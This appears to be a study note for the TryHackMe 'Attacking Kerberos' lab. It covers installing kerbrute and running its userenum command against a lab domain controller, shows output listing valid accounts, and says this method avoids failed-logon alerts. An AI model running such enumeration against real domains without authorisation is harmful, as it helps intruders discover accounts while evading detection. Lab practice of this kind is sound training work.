# Kerbrute

Tryhackme: [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)

## Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.



## Kerbrute Installation -&#x20;

1.) Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

2.) Rename kerbrute\_linux\_amd64 to kerbrute

3.) `chmod +x kerbrute` - make kerbrute executabl



Details:

1.  **Download the Binary:**

    * Open a terminal.
    * Use `wget` command to download the precompiled binary for Linux. Replace `<URL>` with the direct download link for the Linux binary:

    `wget <URL>`

*   **Rename the Binary:**

    After downloading the binary, rename it to `kerbrute`. Assuming the downloaded file is named `kerbrute_linux_amd64`, use the following command to rename it:

`mv kerbrute_linux_amd64 kerbrute`



**Make the Binary Executable:**

* Use the `chmod` command to make the `kerbrute` binary executable:

`chmod +x kerbrute`



## Enumerating Users w/ Kerbrute -

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1.) cd into the directory that you put Kerbrute

2.) Download the wordlist to enumerate with [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)

3.) `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` - This will brute force user accounts from a domain controller using a supplied wordlist



root@ip-10-10-172-53:\~# ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

Version: v1.0.3 (9dad6e1) - 03/13/24 - Ronnie Flathers @ropnop

2024/03/13 08:58:18 > Using KDC(s): 2024/03/13 08:58:18 > CONTROLLER.local:88

2024/03/13 08:58:18 > \[+] VALID USERNAME:&#x20;

admin1@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME:&#x20;

admin2@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: administrator@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: machine2@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: machine1@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: httpservice@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: sqlservice@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: user1@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME:&#x20;

user2@CONTROLLER.local 2024/03/13 08:58:18 > \[+] VALID USERNAME: user3@CONTROLLER.local 2024/03/13 08:58:18 >&#x20;

Done! Tested 100 usernames (10 valid) in 0.030 seconds
